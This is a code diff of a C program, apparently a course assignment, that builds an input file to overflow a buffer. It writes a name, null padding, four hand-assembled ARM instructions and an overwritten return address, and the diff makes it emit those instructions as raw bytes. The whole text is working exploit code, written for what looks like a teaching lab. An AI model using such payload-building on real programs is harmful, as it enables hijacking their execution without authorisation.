@@ -8,7 +8,7 @@ int main(void)
     int i;
     const char* name = "Tansha Vugarwal";
     unsigned long ulReturnAddress = 0x420078;
-    unsigned int uiMovInstr = MiniAssembler_mov(0, 65);
+    unsigned int uiMovInstr = MiniAssembler_mov(0, 0x41);
     unsigned int uiAdrInstr = MiniAssembler_adr(1, 0x420044, 0xffffbe791624);
     unsigned int uiStrbInstr = MiniAssembler_strb(0, 1);
     unsigned int uiBInstr = MiniAssembler_b(0x40085c, 0xffffbe79162c);
@@ -18,17 +18,24 @@ int main(void)
     psFile = fopen("dataA", "w");
 
     /* Printing out 15-character long name. */
+    /* 0->14 */
     fprintf(psFile, "%s", name);
 
+    /* 15->31 */
     for (i = 0; i < 17; i++)
     {
         putc('\0', psFile); /* Writes 00000000 */
     }
 
-    fprintf(psFile, "%i", uiMovInstr);
-    fprintf(psFile, "%i", uiAdrInstr);
-    fprintf(psFile, "%i", uiStrbInstr);
-    fprintf(psFile, "%i", uiBInstr);    
+    /* 32->35 */
+    fwrite(&uiMovInstr, sizeof(unsigned int), 1, psFile);
+    /* 36->39 */
+    fwrite(&uiAdrInstr, sizeof(unsigned int), 1, psFile);
+    /* 40->43 */
+    fwrite(&uiStrbInstr, sizeof(unsigned int), 1, psFile);
+    /* 44->47 */
+    fwrite(&uiBInstr, sizeof(unsigned int), 1, psFile);
+
     fwrite(&ulReturnAddress, sizeof(unsigned long), 1, psFile);
 
     fclose(psFile);
